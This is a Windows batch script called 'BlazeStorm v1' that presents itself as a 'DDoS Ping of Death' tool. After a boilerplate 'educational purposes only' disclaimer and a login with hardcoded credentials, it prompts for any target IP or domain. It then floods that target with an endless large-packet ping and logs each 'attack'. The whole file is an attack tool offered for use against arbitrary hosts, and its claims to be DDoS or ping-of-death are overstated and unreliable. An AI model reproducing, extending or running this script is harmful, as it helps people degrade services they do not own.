@echo off
title BlazeStorm v1 - DDoS Ping of Death Tool by @CRXBitcoin
color 0A
cls

:: Splash Screen with Disclaimer
call :SplashScreen

:: Authentication
call :Authenticate

:: Main Menu Loop
:menu
cls
color 0A
echo =====================================================
echo              BlazeStorm v1 - Main Menu
echo =====================================================
echo [1] Start Ping Attack
echo [2] Show Help
echo [3] View Logs
echo [4] Exit
echo =====================================================
set /p choice=Choose an option [1-4]: 
if "%choice%"=="1" goto attack
if "%choice%"=="2" goto help
if "%choice%"=="3" goto viewlogs
if "%choice%"=="4" exit
echo Invalid choice, please select [1-4].
timeout /t 2 >nul
goto menu

:: Attack Mode
:attack
cls
color 0E
echo =====================================================
echo              BlazeStorm v1 - Attack Mode
echo =====================================================
set /p target=Enter the target IP or domain: 
if "%target%"=="" (
    echo Please enter a valid target IP or domain.
    timeout /t 2 >nul
    goto attack
)

set /p packetsize=Enter the packet size (max 65500): 
if "%packetsize%"=="" (
    echo Please enter a valid packet size.
    timeout /t 2 >nul
    goto attack
)
if %packetsize% GTR 65500 (
    echo Packet size exceeds maximum allowed value.
    timeout /t 2 >nul
    goto attack
)

cls
:: Attack Confirmation
color 0E
echo =====================================================
echo              BlazeStorm v1 Initialized
echo             Target: %target%
echo          Packet Size: %packetsize% bytes
echo =====================================================
echo Sending high-volume ICMP packets...
echo Press Ctrl+C to stop the attack at any time.
echo =====================================================
timeout /t 3 >nul

:: Start the Ping Attack (Indefinite)
color 0C
echo Attacking %target% with %packetsize% byte packets...

:: Log the attack for future reference
call :LogAttack %target% %packetsize%

:: Infinite Ping Attack
ping %target% -t -l %packetsize%
goto menu

:: Log Attack Details
:LogAttack
set timestamp=%date% %time%
echo [%timestamp%] Attack initiated on %1 with packet size %2 bytes. >> attack_log.txt
goto :eof

:: Help Section
:help
cls
color 0E
echo =====================================================
echo             BlazeStorm v1 - Help Menu
echo =====================================================
echo [1] Start Ping Attack: Launch a DDoS Ping of Death
echo [2] Show this Help Menu
echo [3] View logs of previous attacks
echo [4] Exit: Exit the application
echo =====================================================
echo Press any key to return to the main menu...
pause >nul
goto menu

:: View Logs Section
:viewlogs
cls
color 0A
echo =====================================================
echo               BlazeStorm v1 - Logs
echo =====================================================
echo Showing recent attacks:
echo =====================================================
type attack_log.txt
echo =====================================================
echo Press any key to return to the main menu...
pause >nul
goto menu

:: End of Batch Script

:: Splash Screen with Disclaimer
:SplashScreen
cls
color 0C
echo =====================================================
echo     BlazeStorm v1 - DDoS Ping of Death Tool
echo =====================================================
echo                    DISCLAIMER
echo =====================================================
echo This tool is intended for educational purposes only. 
echo Unauthorized use of this tool on systems you do not own 
echo or have explicit permission to test is illegal and unethical.
echo By using this tool, you agree to assume all responsibility 
echo for your actions. The creator of this tool is not responsible 
echo for any damage caused by its use.
echo =====================================================
echo Press any key to accept and continue or Ctrl+C to exit.
pause >nul
goto Authenticate

:: Authentication Function
:Authenticate
cls
color 0A
setlocal enabledelayedexpansion

:: Define Username and Password
set "username=admin"
set "password=yourpassword"

:: Prompt for Username
set /p user_input=Enter Username: 
if "%user_input%" NEQ "%username%" (
    echo Invalid Username. Try again.
    timeout /t 2 >nul
    goto Authenticate
)

:: Prompt for Password
set /p pass_input=Enter Password: 
if "%pass_input%" NEQ "%password%" (
    echo Invalid Password. Try again.
    timeout /t 2 >nul
    goto Authenticate
)

:: If credentials are correct, proceed
echo Authentication successful.
timeout /t 2 >nul
goto menu
